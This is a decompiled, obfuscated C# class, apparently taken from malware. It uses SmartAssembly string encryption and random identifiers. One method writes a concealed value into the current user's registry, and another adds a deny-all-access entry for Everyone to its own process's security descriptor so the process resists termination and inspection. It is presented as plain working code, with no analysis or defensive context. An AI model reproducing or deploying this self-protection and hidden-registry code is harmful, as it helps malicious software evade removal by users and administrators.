using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace uBrdXrCSgnwM;

internal sealed class HPiAcCbPNhYtgW
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr PNDqFcnQzuCwUt, int EpzTMShqDwob, [Out] byte[] jNUNVfRTsbDt, uint XeKSUwzkwlA, out uint vBqIBVWkqfejw);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr BovAwhaKNmcjMz, int mDHKwKZmxRjJTEkvI, [In] byte[] UWmyGSJgCOsk);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void WMjshALAhNSD(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(hWHDXjXKuyuXQ.XtEtTgUvwHGMW(hWHDXjXKuyuXQ.WSyblavDtYINn(getString_0(107412507))));
			registryKey.SetValue(hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107412402)), getString_0(107381892));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor LFUhIVwSXjy(IntPtr intptr_0)
	{
		byte[] jNUNVfRTsbDt = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, jNUNVfRTsbDt, 0u, out var vBqIBVWkqfejw);
		if ((long)vBqIBVWkqfejw > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, jNUNVfRTsbDt = new byte[vBqIBVWkqfejw], vBqIBVWkqfejw, out vBqIBVWkqfejw))
		{
			return null;
		}
		return new RawSecurityDescriptor(jNUNVfRTsbDt, 0);
	}

	private void mTLbkCfbuwq(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void BAXnzxBvlCrH()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = LFUhIVwSXjy(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			mTLbkCfbuwq(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static HPiAcCbPNhYtgW()
	{
		Strings.CreateGetStringDelegate(typeof(HPiAcCbPNhYtgW));
	}
}
